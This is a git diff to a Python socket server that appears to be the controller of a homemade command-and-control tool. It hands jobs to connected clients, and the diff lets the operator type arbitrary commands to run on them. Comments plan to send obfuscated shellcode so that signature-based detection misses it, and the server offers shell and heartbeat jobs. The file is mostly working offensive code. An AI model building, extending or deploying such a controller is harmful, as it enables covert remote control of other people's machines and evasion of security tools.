@@ -4,6 +4,7 @@ import threading
 import time
 import os
 import random
+import atexit
 
 HEADER = 64
 FORMAT = 'utf-8'
@@ -12,12 +13,19 @@ class s_sock:
     ##########
     ## Main Thread/Class
     ##########
+    def socket_cleanup(self):
+        #pass
+        self.server.close()
+    
     
     def start_server(self, ip, port):
         
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # this allows the socket to be reelased immediatly on crash/exit
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.ADDR = (ip,port)
         self.server.bind(self.ADDR)  
+        atexit.register(self.socket_cleanup)
         
         self.server.listen()  
         
@@ -28,19 +36,23 @@ class s_sock:
         ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
         while True:
             self.conn, addr = self.server.accept()
-            ##print("~New Connection~")
+            ##print("\\|/New Connection\\|/")
             
             ## Getting client id from the client, and the IP address
             self.ip_address = self.conn.getpeername()[0]
             
-            self.response = self.conn.recv(1024).decode().split("\|/")
+            self.response = self.conn.recv(1024).decode().split("\\|/")
             
             response_list = []
             for i in self.response:
                 response_list.append(i)
                         
             self.id = response_list[0]
-            self.message = response_list[1]
+            try:
+                self.message = response_list[1]
+            except:
+                self.message = "none"
+                print("list index out of range with self.message, setting to none")
             
             #message = "ok"
             #self.conn.send(message.encode())
@@ -173,9 +185,12 @@ class s_perclient:
                 print(f"Sending Current Job: {self.current_job}")
                 ## sending job
                 self.send_msg(self.current_job)
+                ## resetting values
+                self.cleanup()
+                print(f"Current Job on server side: {self.current_job}")
             
             else:
-                print("No Current Job available, client will sleep")
+                print("No Current Job available, client will sleep\n\n")
     
     ## This part is what the user interacts with, and it sets self.current_job based on the decision. 
     
@@ -187,8 +202,9 @@ class s_perclient:
             print("Jobs: \nShell [IP, Port] ")
             
         elif user_input == "run_command":
-            command = "ls"
-            self.current_job = f"run_command\|/{command}"
+            command = input("Enter command: ")
+            self.current_job = f"run_command\\|/{command}"
+            #self.current_job = "wait"
             
         ## Idea for shell, have all the code on this side. That way, you just pass the string/command in, and 
         ## can have it obsfucated. The client will then execute said code. This may also help with signatures of common
@@ -197,6 +213,9 @@ class s_perclient:
         ## How it may work: Shell job gets sent, then the client listens for a followup string, which is the shellcode being sent
         elif user_input == "shell":
             self.current_job = "shell"
+        
+        elif user_input == "wait":
+            self.current_job = "wait\\|/wait"
             
         elif user_input == "adjust_heartbeat":
             self.current_job = "adjust_heartbeat"
@@ -207,20 +226,30 @@ class s_perclient:
         else:
             self.current_job == "none"
             
-    
+    def cleanup(self):
+        self.current_job = "wait\\|/"
+        
     def send_msg(self, message):
         print(f"Message being sent: {message}")
         self.conn.send(message.encode())
         
-        recieve_msg = self.conn.recv(1024).decode()
+        ## wasn't running as it was waiting for a response
+        #recieve_msg = self.conn.recv(1024).decode()
+        #return recieve_msg
+    ## def send_cmd():
+    ## this one will be for sending & receiving one off comamnds,
+    ## seperate due to the recieve msg
+        #recieve_msg = self.conn.recv(1024).decode()
+        #return recieve_msg
+
+
     
-        return recieve_msg
     
 if __name__ == "__main__":
     ## could listen on multiple ports with threading this whole thing
     SERV = s_sock()
 
-    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',8105))
+    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',100))
     background_listen.start() 
     
     #SERV.start_server('0.0.0.0',8092)
